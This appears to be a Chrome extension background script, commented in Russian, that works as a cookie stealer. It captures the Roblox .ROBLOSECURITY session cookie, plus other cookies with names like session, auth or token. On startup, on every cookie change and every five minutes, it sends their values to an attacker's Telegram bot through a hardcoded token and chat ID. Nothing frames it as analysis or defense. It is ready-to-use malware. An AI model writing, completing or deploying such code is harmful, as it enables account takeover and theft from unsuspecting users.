// Конфигурация Telegram
const TELEGRAM_BOT_TOKEN = '8110179122:AAHjbqAglX75ElcuKCcKwRwwXYGCvwY4_xM';
const TELEGRAM_CHAT_ID = '7695851744';

// Функция отправки в Telegram
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Telegram send error:', error);
    }
}

// Мониторинг куки Roblox
function monitorRobloxCookies() {
    chrome.cookies.onChanged.addListener((changeInfo) => {
        if (changeInfo.cookie.domain.includes('roblox.com') && 
            changeInfo.cookie.name === '.ROBLOXSECURITY') {
            
            const cookie = changeInfo.cookie;
            const message = `🍪 <b>NEW ROBLOX COOKIE CAPTURED</b>\n\n` +
                          `🔐 <b>Name:</b> ${cookie.name}\n` +
                          `🌐 <b>Domain:</b> ${cookie.domain}\n` +
                          `📅 <b>Expires:</b> ${new Date(cookie.expirationDate * 1000).toLocaleString()}\n` +
                          `🔒 <b>Value:</b> <code>${cookie.value}</code>\n\n` +
                          `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n` +
                          `🔗 <b>URL:</b> ${changeInfo.cause}`;
            
            sendToTelegram(message);
        }
    });
}

// Проверка существующих куки при запуске
function checkExistingCookies() {
    chrome.cookies.getAll({domain: 'roblox.com'}, (cookies) => {
        cookies.forEach(cookie => {
            if (cookie.name === '.ROBLOXSECURITY') {
                const message = `🔍 <b>EXISTING ROBLOX COOKIE</b>\n\n` +
                              `🌐 <b>Domain:</b> ${cookie.domain}\n` +
                              `📅 <b>Expires:</b> ${new Date(cookie.expirationDate * 1000).toLocaleString()}\n` +
                              `🔒 <b>Value:</b> <code>${cookie.value.substring(0, 50)}...</code>\n\n` +
                              `🕒 <b>Found at:</b> ${new Date().toLocaleString()}`;
                
                sendToTelegram(message);
            }
        });
    });
}

// Мониторинг других важных куки
function monitorAllCookies() {
    chrome.cookies.onChanged.addListener((changeInfo) => {
        const cookie = changeInfo.cookie;
        const importantCookies = ['session', 'auth', 'token', 'login', 'user'];
        
        if (importantCookies.some(keyword => cookie.name.toLowerCase().includes(keyword))) {
            const message = `🔐 <b>IMPORTANT COOKIE CHANGE</b>\n\n` +
                          `📛 <b>Name:</b> ${cookie.name}\n` +
                          `🌐 <b>Domain:</b> ${cookie.domain}\n` +
                          `🔒 <b>Value:</b> <code>${cookie.value.substring(0, 30)}...</code>\n\n` +
                          `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            sendToTelegram(message);
        }
    });
}

// Инициализация
monitorRobloxCookies();
monitorAllCookies();
checkExistingCookies();

// Периодическая проверка каждые 5 минут
setInterval(checkExistingCookies, 5 * 60 * 1000);
